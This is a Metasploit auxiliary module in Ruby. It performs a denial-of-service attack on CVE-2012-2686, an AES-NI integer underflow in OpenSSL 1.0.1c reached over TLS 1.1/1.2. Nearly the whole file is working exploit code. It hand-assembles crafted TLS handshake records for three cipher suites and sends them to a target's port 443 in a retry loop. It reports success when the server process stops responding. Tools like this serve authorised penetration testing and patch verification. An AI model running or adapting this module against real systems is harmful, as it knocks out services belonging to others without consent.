##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# auxilary/dos/ssl/openssl_aesni
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'OpenSSL TLS 1.1 and 1.2 AES-NI DoS',
      'Description'	=> %q{
          The AES-NI implementation of OpenSSL 1.0.1c does not properly compute the
        length of an encrypted message when used with a TLS version 1.1 or above. This
        leads to an integer underflow which can cause a DoS. The vulnerable function
        aesni_cbc_hmac_sha1_cipher is only included in the 64-bit versions of OpenSSL.
        This module has been tested successfully on Ubuntu 12.04 (64-bit) with the default
        OpenSSL 1.0.1c package.
      },
      'Author'	=>
        [
          'Wolfgang Ettlinger <wolfgang.ettlinger[at]gmail.com>'
        ],
      'License'		=> MSF_LICENSE,
      'References'	=>
        [
          [ 'CVE', '2012-2686'],
          [ 'URL', 'https://www.openssl.org/news/secadv/20130205.txt' ]
        ],
      'DisclosureDate' => '2013-02-05'))

    register_options(
      [
        Opt::RPORT(443),
        OptInt.new('MAX_TRIES', [true,  "Maximum number of tries", 300])
      ])
  end

  def run
    # Client Hello
    p1 =  "\x16"				# Content Type: Handshake
    p1 << "\x03\x01"				# Version: TLS 1.0
    p1 << "\x00\x7e"				# Length: 126
    p1 << "\x01"				# Handshake Type: Client Hello
    p1 << "\x00\x00\x7a"			# Length: 122
    p1 << "\x03\x02"				# Version: TLS 1.1
    p1 << ("A" * 32)				# Random
    p1 << "\x00"				# Session ID Length: 0
    p1 << "\x00\x08"				# Cypher Suites Length: 6
    p1 << "\xc0\x13"				# - ECDHE-RSA-AES128-SHA
    p1 << "\x00\x39"				# - DHE-RSA-AES256-SHA
    p1 << "\x00\x35"				# - AES256-SHA
    p1 << "\x00\xff"				# - EMPTY_RENEGOTIATION_INFO_SCSV
    p1 << "\x01"				# Compression Methods Length: 1
    p1 << "\x00"				# - NULL-Compression
    p1 << "\x00\x49"				# Extensions Length: 73
    p1 << "\x00\x0b"				# - Extension: ec_point_formats
    p1 << "\x00\x04"				#   Length: 4
    p1 << "\x03"				#   EC Points Format Length: 3
    p1 << "\x00"				#   - uncompressed
    p1 << "\x01"				#   - ansiX962_compressed_prime
    p1 << "\x02"				#   - ansiX962_compressed_char2
    p1 << "\x00\x0a"				# - Extension: elliptic_curves
    p1 << "\x00\x34"				#   Length: 52
    p1 << "\x00\x32"				#   Elliptic Curves Length: 50
    # 25 Elliptic curves:
    p1 << "\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a"
    p1 << "\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04"
    p1 << "\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
    p1 << "\x00\x11"

    p1 << "\x00\x23"				# - Extension: SessionTicket TLS
    p1 << "\x00\x00"				#   Length: 0
    p1 << "\x00\x0f"				# - Extension: Heartbeat
    p1 << "\x00\x01"				#   Length: 1
    p1 << "\x01"				#   Peer allowed to send requests


    # Change Cipher Spec Message
    p2_cssm =  "\x14"				# Content Type: Change Cipher Spec
    p2_cssm << "\x03\x02"			# Version: TLS 1.1
    p2_cssm << "\x00\x01"			# Length: 1
    p2_cssm << "\x01"				# Change Cipher Spec Message


    # Encrypted Handshake Message
    p2_ehm =  "\x16"				# Content Type: Handshake
    p2_ehm << "\x03\x02"			# Version: TLS 1.1
    p2_ehm << "\x00\x40"			# Length: 64
    p2_ehm << ("A" * 64)			# Encrypted Message


    # Client Key Exchange, Change Cipher Spec, Encrypted Handshake
    # AES256-SHA
    p2_aes_sha =  "\x16"			# Content Type: Handshake
    p2_aes_sha << "\x03\x02"			# Version: TLS 1.1
    p2_aes_sha << "\x01\x06"			# Length: 262
    p2_aes_sha << "\x10"			# Handshake Type: Client Key Exchange
    p2_aes_sha << "\x00\x01\x02"		# Length: 258
    p2_aes_sha << "\x01\x00"			# Encrypted PreMaster Length: 256
    p2_aes_sha << ("\x00" * 256)		# Encrypted PresMaster (irrelevant)
    p2_aes_sha << p2_cssm 			# Change Cipher Spec Message
    p2_aes_sha << p2_ehm			# Encrypted Handshake Message


    # DHE-RSA-AES256-SHA
    p2_dhe =  "\x16"				# Content Type: Handshake
    p2_dhe << "\x03\x02"			# Version: TLS 1.1
    p2_dhe << "\x00\x46"			# Length: 70
    p2_dhe << "\x10"				# Handshake Type: Client Key Exchange
    p2_dhe << "\x00\x00\x42"			# Length: 66
    p2_dhe << "\x00\x40"			# DH Pubkey Length: 64
    p2_dhe << ("A" * 64)			# DH Pubkey
    p2_dhe << p2_cssm				# Change Cipher Spec Message
    p2_dhe << p2_ehm				# Encrypted Handshake Message


    # ECDHE-RSA-AES128-SHA
    p2_ecdhe =  "\x16"				# Content Type: Handshake
    p2_ecdhe << "\x03\x02"			# Version: TLS 1.1
    p2_ecdhe << "\x00\x46"			# Length: 70
    p2_ecdhe << "\x10"				# Handshake Type: Client Key Exchange
    p2_ecdhe << "\x00\x00\x42"			# Length: 66
    p2_ecdhe << "\x41"				# EC DH Pubkey Length: 65
    # EC DH Pubkey:
    p2_ecdhe << "\x04\x2f\x22\xf4\x06\x3f\xa1\xf7\x3d\xb6\x55\xbc\x68\x65\x57\xd8"
    p2_ecdhe << "\x03\xe5\xaa\x36\xeb\x0f\x52\x5a\xaf\xd0\x9f\xf8\xc7\xfe\x09\x69"
    p2_ecdhe << "\x5b\x38\x95\x58\xb6\x0d\x27\x53\xe9\x63\xcb\x96\xb3\x54\x47\xa6"
    p2_ecdhe << "\xb2\xe6\x8b\x2a\xd9\x03\xb4\x85\x46\xd9\x1c\x5f\xd1\xf7\x7b\x73"
    p2_ecdhe << "\x40"
    p2_ecdhe << p2_cssm				# Change Cipher Spec Message
    p2_ecdhe << p2_ehm				# Encrypted Handshake Message


    maxtries = datastore['MAX_TRIES']

    success = false

    for i in 0..maxtries
      print_status("Try \##{i}")

      connect

      sock.put(p1)
      resp = sock.get_once

      cs = get_cipher_suite(resp)

      if cs == 0xc013 # ECDHE-RSA-AES128-SHA
        p2 = p2_ecdhe
      elsif cs == 0x0039 # DHE-RSA-AES256-SHA
        p2 = p2_dhe
      elsif cs == 0x0035 # AES256-SHA
        p2 = p2_aes_sha
      else
        print_error("No common ciphers!")
        return
      end

      sock.put(p2)

      alert = nil

      begin
        alert = sock.get_once(-1, 2)
      rescue EOFError
        print_good("DoS successful. process on #{rhost} did not respond.")
        success = true
        break
      end

      disconnect

    end

    if success == false
      print_error("DoS unsuccessful.")
    end
  end

  def get_cipher_suite(resp)
    offset = 0

    while offset < resp.length
      type = (resp[offset, 1]).unpack("C")[0]

      if not type == 22 # Handshake
        return nil
      end

      len = (resp[offset+3, 2]).unpack("n")[0]
      hstype = (resp[offset+5, 1]).unpack("C")[0]

      if hstype == 2 # Server Hello
        return (resp[offset+44, 2]).unpack("n")[0]
      end

      offset += len
    end

  end
end

